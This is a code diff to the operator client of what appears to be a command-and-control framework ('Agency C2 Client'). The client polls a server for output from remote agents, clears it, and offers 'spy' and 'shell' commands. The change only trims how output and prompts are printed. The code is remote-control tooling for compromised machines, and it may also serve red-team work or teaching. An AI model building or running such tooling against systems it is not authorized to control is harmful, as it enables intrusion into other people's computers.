@@ -1,7 +1,6 @@
 import requests
 import argparse
 import time
-import sys
 import threading
 from datetime import datetime
 
@@ -9,24 +8,17 @@ from datetime import datetime
 current_polling_thread = None
 stop_polling = threading.Event()
 
-def poll_for_output(server, agent, show_prompt):
-    global prompt
+def poll_for_output(server, agent):
     while not stop_polling.is_set():
         response = requests.get(f"{server}/spy/{agent}", timeout=5)
         if response.status_code == 200:
             task_output = response.json().get('output')
             if task_output:
-                sys.stdout.flush()  # Flush any pending output
-                print("\n---------- Command Output ----------\n")
                 print(task_output)
-                print("\n------------------------------------\n")
-                requests.get(f"{server}/cls/{agent}")  # Clear output on server
-                if show_prompt:
-                    print(prompt, end='')  # Print the prompt after the output
-                    sys.stdout.flush()
-        time.sleep(3)
+                requests.get(f"{server}/cls/{agent}")  # Notify server to clear the output
+        time.sleep(3)  # Poll every 3 seconds, adjust as needed
 
-def start_polling_thread(server, agent, show_prompt):
+def start_polling_thread(server, agent):
     global current_polling_thread, stop_polling
 
     # Stop the current polling thread if it's running
@@ -36,11 +28,10 @@ def start_polling_thread(server, agent, show_prompt):
 
     # Reset the stop flag and start a new polling thread
     stop_polling.clear()
-    current_polling_thread = threading.Thread(target=poll_for_output, args=(server, agent, show_prompt), daemon=True)
+    current_polling_thread = threading.Thread(target=poll_for_output, args=(server, agent), daemon=True)
     current_polling_thread.start()
 
 def menu(ip, port, name):
-    global prompt
     server = f"http://{ip}:{port}"
     agent = 0
     prompt = f"Agency C2 Client {name} $ > "
@@ -56,10 +47,9 @@ def menu(ip, port, name):
 
         if "spy" in command:
             agent = command[4:]
+            print(agent)
             prompt = f"Spy {agent} # >"
-            print(prompt, end='')
-            sys.stdout.flush()
-            start_polling_thread(server, agent, show_prompt=False)
+            start_polling_thread(server, agent)
             continue
 
         if "shell" in command:
